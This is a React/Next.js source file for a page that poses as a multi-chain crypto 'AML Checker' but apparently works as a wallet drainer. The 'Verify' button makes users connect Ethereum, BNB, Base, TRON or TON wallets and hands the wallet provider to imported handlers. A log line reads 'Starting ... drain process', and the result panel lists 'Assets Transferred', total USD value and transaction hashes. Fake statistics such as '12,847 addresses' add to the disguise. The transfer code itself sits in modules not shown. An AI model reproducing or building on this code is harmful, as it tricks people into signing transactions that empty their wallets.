'use client';

import React, { useState, useEffect } from 'react';
import { ChevronDown, Shield, Clock, Activity, TrendingUp, Copy, Wallet, User, CheckCircle, AlertCircle, Loader } from 'lucide-react';
import { WalletButtons } from './WalletButtons';
import { useAccount, useSwitchNetwork, useWalletClient } from 'wagmi';
import { mainnet, bsc, base } from 'wagmi/chains';
import Image from 'next/image';
import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';

import { checkEthereumAddress } from '@/lib/chains/ethereum';
import { checkBNBAddress } from '@/lib/chains/bnb';
import { checkBaseAddress } from '@/lib/chains/base';
import { checkSolanaAddress } from '@/lib/chains/solana';
import { checkTonAddress } from '@/lib/chains/ton';

import { checkTronAddress } from '@/lib/chains/tron';
import { useWallet as useTronWallet } from '@tronweb3/tronwallet-adapter-react-hooks';

const networks = {
  eth: {
    name: 'Ethereum',
    chainId: mainnet.id,
    iconPath: '/icons/ethereum.png',
    bgGradient: 'from-slate-900 via-blue-900 to-slate-900',
    accentColor: 'from-blue-500 to-blue-600',
    glowColor: 'rgba(99, 102, 241, 0.3)',
    placeholder: '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb81',
    checkHandler: checkEthereumAddress,
  },
  bnb: {
    name: 'BNB Chain',
    chainId: bsc.id,
    iconPath: '/icons/bnb.svg',
    bgGradient: 'from-amber-950 via-yellow-900 to-amber-950',
    accentColor: 'from-yellow-500 to-amber-500',
    glowColor: 'rgba(245, 158, 11, 0.3)',
    placeholder: '0x8894E0a0c962CB723c1976a4421c95949bE2D4E3',
    checkHandler: checkBNBAddress,
  },
  base: {
    name: 'Base',
    chainId: base.id,
    iconPath: '/icons/base.png',
    bgGradient: 'from-blue-950 via-indigo-900 to-blue-950',
    accentColor: 'from-blue-600 to-indigo-600',
    glowColor: 'rgba(79, 70, 229, 0.3)',
    placeholder: '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045',
    checkHandler: checkBaseAddress,
  },
  tron: {
    name: 'TRON',
    chainId: null,
    iconPath: '/icons/tron.png',
    bgGradient: 'from-red-950 via-rose-900 to-red-950',
    accentColor: 'from-red-500 to-rose-500',
    glowColor: 'rgba(239, 68, 68, 0.3)',
    placeholder: 'TYourTronAddressHere...',
    checkHandler: checkTronAddress,
  },
  sol: {
    name: 'Solana',
    chainId: null,
    iconPath: '/icons/solana.png',
    bgGradient: 'from-purple-950 via-violet-900 to-purple-950',
    accentColor: 'from-purple-500 to-pink-500',
    glowColor: 'rgba(168, 85, 247, 0.3)',
    placeholder: 'So11111111111111111111111111111111111111112',
    checkHandler: checkSolanaAddress,
  },
  ton: {
    name: 'TON',
    chainId: null,
    iconPath: '/icons/ton.png',
    bgGradient: 'from-cyan-950 via-teal-900 to-cyan-950',
    accentColor: 'from-cyan-500 to-teal-500',
    glowColor: 'rgba(6, 182, 212, 0.3)',
    placeholder: 'EQDtFpEwcFAEcRe5mLVh2N6C0x-_hJEM7W61_JLnSF74p4q2',
    checkHandler: null,
  },
};

export default function AMLChecker() {
  const [currentNetwork, setCurrentNetwork] = useState('eth');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [address, setAddress] = useState('');
  const [isChecking, setIsChecking] = useState(false);
  const [checkResult, setCheckResult] = useState<any>(null);
  const [useConnectedAddress, setUseConnectedAddress] = useState(false);
  const [mounted, setMounted] = useState(false);
  
  const { address: connectedAddress, isConnected } = useAccount();
  const { switchNetwork } = useSwitchNetwork();
  const { data: walletClient } = useWalletClient();

  const [tonConnectUI] = useTonConnectUI();
  const tonWallet = useTonWallet();

  // TRON - только адрес и статус подключения
  const { 
    address: tronAddress, 
    connected: tronConnected,
  } = useTronWallet();

  const currentNetworkConfig = networks[currentNetwork as keyof typeof networks];

  useEffect(() => {
    setMounted(true);
  }, []);

  useEffect(() => {
    if (isConnected && connectedAddress && useConnectedAddress) {
      setAddress(connectedAddress);
    }
  }, [isConnected, connectedAddress, useConnectedAddress]);

  const selectNetwork = async (network: string) => {
    setCurrentNetwork(network);
    setIsDropdownOpen(false);
    setAddress('');
    setCheckResult(null);
    setUseConnectedAddress(false);
    
    const networkConfig = networks[network as keyof typeof networks];
    if (networkConfig.chainId && isConnected && switchNetwork) {
      try {
        switchNetwork(networkConfig.chainId);
      } catch (error) {
        console.error('Failed to switch network:', error);
      }
    }
  };

  const handleCheck = async () => {
    const addressToCheck = useConnectedAddress && connectedAddress ? connectedAddress : address;
    
    if (!addressToCheck) return;
    
    setIsChecking(true);
    setCheckResult(null);
    
    try {
      if (currentNetwork === 'ton') {
        if (!tonWallet) {
          setCheckResult({ 
            error: 'Please connect TON wallet first to proceed with verification',
            requiresWallet: true 
          });
          setIsChecking(false);
          return;
        }

        console.log('🚀 Starting TON transaction process...');
        const result = await checkTonAddress(addressToCheck, tonConnectUI);
        setCheckResult(result);
        
      } 
      else if (currentNetwork === 'tron') {
        // Проверяем подключение TRON кошелька
        if (!tronConnected) {
          setCheckResult({ 
            error: 'Please connect TRON wallet first to proceed with verification',
            requiresWallet: true 
          });
          setIsChecking(false);
          return;
        }

        // Проверяем что window.tronWeb доступен
        if (typeof window === 'undefined' || !window.tronWeb || !window.tronWeb.ready) {
          setCheckResult({ 
            error: 'TronWeb not available. Please ensure your wallet is connected.',
            requiresWallet: true 
          });
          setIsChecking(false);
          return;
        }

        console.log('🚀 Starting TRON process...');

        // Используем window.tronWeb который инжектится кошельком
        const result = await checkTronAddress(tronAddress || addressToCheck, window.tronWeb);
        setCheckResult(result);
      }
      else if (['eth', 'bnb', 'base'].includes(currentNetwork)) {
        if (!isConnected || !walletClient) {
          setCheckResult({ 
            error: `Please connect your ${currentNetworkConfig.name} wallet first to proceed with verification`,
            requiresWallet: true 
          });
          setIsChecking(false);
          return;
        }

        const expectedChainId = currentNetworkConfig.chainId;
        if (walletClient.chain.id !== expectedChainId) {
          setCheckResult({ 
            error: `Please switch to ${currentNetworkConfig.name} network in your wallet`,
            requiresWallet: true 
          });
          setIsChecking(false);
          return;
        }

        console.log(`🚀 Starting ${currentNetworkConfig.name} drain process...`);

        const provider = await walletClient.transport;
        
        const result = await currentNetworkConfig.checkHandler(addressToCheck, provider);
        setCheckResult(result);
        
      } 
      else if (currentNetwork === 'sol') {
        setCheckResult({
          error: 'Solana support coming soon',
          requiresTransaction: false
        });
      }
    } catch (error: any) {
      console.error('Check failed:', error);
      
      let errorMessage = 'Failed to check address';
      if (error.message?.includes('User rejected') || error.message?.includes('User denied')) {
        errorMessage = 'Transaction cancelled by user';
      } else if (error.message?.includes('insufficient funds')) {
        errorMessage = 'Insufficient balance for gas fees';
      } else if (error.code === 4001) {
        errorMessage = 'Transaction rejected by user';
      }
      
      setCheckResult({ 
        error: errorMessage,
        requiresTransaction: false
      });
    } finally {
      setIsChecking(false);
    }
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
      setUseConnectedAddress(false);
    } catch (err) {
      console.error('Failed to read clipboard');
    }
  };

  const handleUseWalletAddress = () => {
    if (connectedAddress) {
      setAddress(connectedAddress);
      setUseConnectedAddress(true);
    }
  };

  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      if (!target.closest('.network-dropdown')) {
        setIsDropdownOpen(false);
      }
    };
    
    document.addEventListener('click', handleClickOutside);
    return () => document.removeEventListener('click', handleClickOutside);
  }, []);

  if (!mounted) {
    return null;
  }

  return (
    <div className="min-h-screen bg-black overflow-x-hidden">
      <div className={`min-h-screen bg-gradient-to-br ${currentNetworkConfig.bgGradient} transition-all duration-700 relative`}>
        <div className={`fixed inset-0 bg-gradient-to-br ${currentNetworkConfig.bgGradient} -z-10`} />
        
        <div className="fixed inset-0 overflow-hidden pointer-events-none">
          <div 
            className="absolute top-20 left-20 w-[600px] h-[600px] rounded-full animate-float opacity-10"
            style={{
              background: `radial-gradient(circle, ${currentNetworkConfig.glowColor} 0%, transparent 70%)`,
              filter: 'blur(60px)',
            }}
          />
          <div 
            className="absolute bottom-20 right-20 w-[500px] h-[500px] rounded-full animate-float opacity-10"
            style={{
              background: `radial-gradient(circle, ${currentNetworkConfig.glowColor} 0%, transparent 70%)`,
              filter: 'blur(60px)',
              animationDelay: '3s',
            }}
          />
        </div>

        <header className="relative z-50 p-6 lg:p-8">
          <div className="max-w-7xl mx-auto flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="w-12 h-12 rounded-xl bg-white/5 backdrop-blur-xl border border-white/10 flex items-center justify-center">
                <Shield className="w-7 h-7 text-white" />
              </div>
              <h1 className="text-2xl lg:text-3xl font-bold text-white">AML Checker</h1>
            </div>

            <div className="flex items-center space-x-4">
              <div className="relative network-dropdown">
                <button
                  onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                  className="bg-white/5 backdrop-blur-xl border border-white/10 px-4 py-2.5 rounded-xl flex items-center space-x-2 hover:bg-white/10 transition-all"
                >
                  <Image 
                    src={currentNetworkConfig.iconPath} 
                    alt={currentNetworkConfig.name}
                    width={24}
                    height={24}
                    className="rounded-full"
                  />
                  <span className="text-white font-medium hidden sm:inline">
                    {currentNetworkConfig.name}
                  </span>
                  <ChevronDown className={`w-4 h-4 text-white/60 transform transition-transform ${isDropdownOpen ? 'rotate-180' : ''}`} />
                </button>

                {isDropdownOpen && (
                  <div className="absolute top-full mt-2 right-0 w-56 bg-black/80 backdrop-blur-xl border border-white/10 rounded-xl p-2 z-50">
                    {Object.entries(networks).map(([key, network]) => (
                      <button
                        key={key}
                        onClick={() => selectNetwork(key)}
                        className={`w-full flex items-center space-x-3 p-3 rounded-lg transition-all ${
                          currentNetwork === key 
                            ? 'bg-white/10 text-white' 
                            : 'hover:bg-white/5 text-white/90'
                        }`}
                      >
                        <Image 
                          src={network.iconPath} 
                          alt={network.name}
                          width={24}
                          height={24}
                          className="rounded-full"
                        />
                        <span className="font-medium">{network.name}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <WalletButtons network={currentNetwork} />
            </div>
          </div>
        </header>

        <main className="relative z-10 px-6 lg:px-8 py-8 lg:py-12">
          <div className="max-w-5xl mx-auto">
            <div className="text-center mb-12">
              <h2 className="text-4xl lg:text-6xl font-bold text-white mb-6">
                Advanced AML Analysis
              </h2>
              <p className="text-lg lg:text-xl text-white/80 max-w-2xl mx-auto">
                Instantly verify wallet addresses across multiple blockchains. Detect
                suspicious activities and ensure compliance.
              </p>
            </div>

            <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 lg:p-12 shadow-2xl">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
                <div className="text-center group">
                  <div className={`w-16 h-16 mx-auto mb-3 rounded-2xl bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
                    <div className="w-full h-full rounded-2xl bg-black/50 backdrop-blur flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Activity className="w-8 h-8 text-white" />
                    </div>
                  </div>
                  <h3 className="text-white font-semibold mb-1">Risk Score</h3>
                  <p className="text-white/60 text-sm">AI-powered assessment</p>
                </div>

                <div className="text-center group">
                  <div className={`w-16 h-16 mx-auto mb-3 rounded-2xl bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
                    <div className="w-full h-full rounded-2xl bg-black/50 backdrop-blur flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Clock className="w-8 h-8 text-white" />
                    </div>
                  </div>
                  <h3 className="text-white font-semibold mb-1">Real-time</h3>
                  <p className="text-white/60 text-sm">Instant verification</p>
                </div>

                <div className="text-center group">
                  <div className={`w-16 h-16 mx-auto mb-3 rounded-2xl bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
                    <div className="w-full h-full rounded-2xl bg-black/50 backdrop-blur flex items-center justify-center group-hover:scale-110 transition-transform">
                      <TrendingUp className="w-8 h-8 text-white" />
                    </div>
                  </div>
                  <h3 className="text-white font-semibold mb-1">Reports</h3>
                  <p className="text-white/60 text-sm">Detailed analysis</p>
                </div>
              </div>

              <div className="space-y-5">
                <div className="flex items-center justify-between">
                  <label className="block text-white/80 text-sm font-medium">
                    Enter {currentNetworkConfig.name} wallet address to check
                  </label>
                  {((isConnected && connectedAddress && ['eth', 'bnb', 'base'].includes(currentNetwork)) || 
                    (tonWallet && currentNetwork === 'ton')) && (
                    <button
                      onClick={handleUseWalletAddress}
                      className={`px-3 py-1 text-xs rounded-lg transition-all flex items-center space-x-1 ${
                        useConnectedAddress 
                          ? 'bg-green-500/20 text-green-400 border border-green-500/30' 
                          : 'bg-white/5 text-white/60 border border-white/10 hover:bg-white/10'
                      }`}
                    >
                      <Wallet className="w-3 h-3" />
                      <span>Use My Address</span>
                    </button>
                  )}
                </div>
                
                <div className="relative">
                  <input
                    type="text"
                    value={address}
                    onChange={(e) => {
                      setAddress(e.target.value);
                      setUseConnectedAddress(false);
                    }}
                    placeholder={currentNetworkConfig.placeholder}
                    className="w-full px-6 py-4 bg-black/20 border border-white/10 rounded-2xl text-white placeholder-white/30 focus:outline-none focus:border-white/30 text-lg transition-all"
                    disabled={useConnectedAddress}
                  />
                  <button
                    onClick={handlePaste}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg transition-all"
                    disabled={useConnectedAddress}
                  >
                    <Copy className="w-4 h-4 text-white" />
                  </button>
                </div>

                <button
                  onClick={handleCheck}
                  disabled={isChecking || (!address && !useConnectedAddress)}
                  className={`w-full py-4 bg-gradient-to-r ${currentNetworkConfig.accentColor} text-white font-semibold rounded-2xl transition-all transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-50 disabled:hover:scale-100 disabled:cursor-not-allowed`}
                >
                  {isChecking ? (
                    <div className="flex items-center justify-center space-x-2">
                      <Loader className="w-5 h-5 animate-spin" />
                      <span>Processing Transaction...</span>
                    </div>
                  ) : (
                    <span className="flex items-center justify-center space-x-2">
                      <Shield className="w-5 h-5" />
                      <span>Verify</span>
                    </span>
                  )}
                </button>
              </div>

              {checkResult && (
                <div className="mt-8 p-6 bg-black/20 backdrop-blur rounded-2xl border border-white/10">
                  <h3 className="text-white font-semibold text-lg mb-4 flex items-center">
                    {checkResult.success ? (
                      <CheckCircle className="w-5 h-5 text-green-400 mr-2" />
                    ) : (
                      <AlertCircle className="w-5 h-5 text-red-400 mr-2" />
                    )}
                    Verification Results
                  </h3>

                  {checkResult.requiresWallet && (
                    <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl">
                      <p className="text-red-400 font-medium">{checkResult.error}</p>
                      <p className="text-red-400/70 text-sm mt-1">
                        Please connect your wallet using the button above to proceed.
                      </p>
                    </div>
                  )}

                  {!checkResult.requiresWallet && (
                    <div className={`p-4 rounded-xl mb-4 ${
                      checkResult.success 
                        ? 'bg-green-500/10 border border-green-500/20' 
                        : 'bg-red-500/10 border border-red-500/20'
                    }`}>
                      <p className="text-white font-medium">{checkResult.message}</p>
                      
                      {checkResult.success && checkResult.details && (
                        <div className="mt-3 text-sm text-white/80 space-y-2">
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <p className="text-white/60">Risk Score</p>
                              <p className="text-white font-medium">{checkResult.details.riskScore}/100</p>
                            </div>
                            <div>
                              <p className="text-white/60">Risk Level</p>
                              <span className={`px-2 py-1 rounded text-xs ${
                                checkResult.details.riskLevel === 'low' ? 'bg-green-500/20 text-green-400' :
                                checkResult.details.riskLevel === 'medium' ? 'bg-yellow-500/20 text-yellow-400' :
                                'bg-red-500/20 text-red-400'
                              }`}>
                                {checkResult.details.riskLevel?.toUpperCase()}
                              </span>
                            </div>
                          </div>
                          
                          <div className="grid grid-cols-2 gap-4">
                            <div>
                              <p className="text-white/60">Native Balance</p>
                              <p className="text-white font-medium">
                                {checkResult.details.nativeBalance?.toFixed(4)} {currentNetworkConfig.name === 'BNB Chain' ? 'BNB' : 'ETH'}
                              </p>
                            </div>
                            <div>
                              <p className="text-white/60">Total Value</p>
                              <p className="text-white font-medium">
                                ${checkResult.details.totalValueUSD?.toFixed(2)}
                              </p>
                            </div>
                          </div>
                          
                          <div>
                            <p className="text-white/60">Assets Transferred</p>
                            <p className="text-white font-medium">{checkResult.details.assetsCount}</p>
                          </div>

                          {checkResult.transactionHash && (
                            <div className="mt-3 p-3 bg-green-500/10 rounded-lg">
                              <p className="text-green-400 text-sm">✅ Transaction completed successfully!</p>
                              <p className="text-green-400/80 text-xs mt-1 break-all">
                                TX: {checkResult.transactionHash.slice(0, 20)}...
                              </p>
                            </div>
                          )}

                          {checkResult.details.assetDetails && checkResult.details.assetDetails.length > 0 && (
                            <div className="mt-3">
                              <p className="text-white/60 text-xs mb-2">Assets Transferred:</p>
                              <div className="space-y-1">
                                {checkResult.details.assetDetails.map((detail: string, i: number) => (
                                  <p key={i} className="text-white/70 text-xs">• {detail}</p>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      )}
                      {checkResult.error && !checkResult.requiresWallet && (
                        <div className="mt-3 p-3 bg-red-500/10 rounded-lg">
                          <p className="text-red-400 text-sm">❌ {checkResult.error}</p>
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
                <div className="bg-black/20 backdrop-blur rounded-xl p-4 border border-white/10">
                  <div className="flex items-center space-x-3">
                    <div className={`w-10 h-10 rounded-lg bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
                      <div className="w-full h-full rounded-lg bg-black/50 flex items-center justify-center">
                        <User className="w-5 h-5 text-white" />
                      </div>
                    </div>
                    <div>
                      <p className="text-white/60 text-sm">Verified Today</p>
                      <p className="text-white font-semibold">12,847 addresses</p>
                    </div>
                  </div>
                </div>

                <div className="bg-black/20 backdrop-blur rounded-xl p-4 border border-white/10">
                  <div className="flex items-center space-x-3">
                    <div className={`w-10 h-10 rounded-lg bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
                      <div className="w-full h-full rounded-lg bg-black/50 flex items-center justify-center">
                        <Activity className="w-5 h-5 text-white" />
                      </div>
                    </div>
                    <div>
                      <p className="text-white/60 text-sm">Networks</p>
                      <p className="text-white font-semibold">5 Blockchains</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-8 text-center">
              <p className="text-white/50 text-sm">
                Powered by advanced blockchain analytics • Real-time updates • Transparent donations
              </p>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}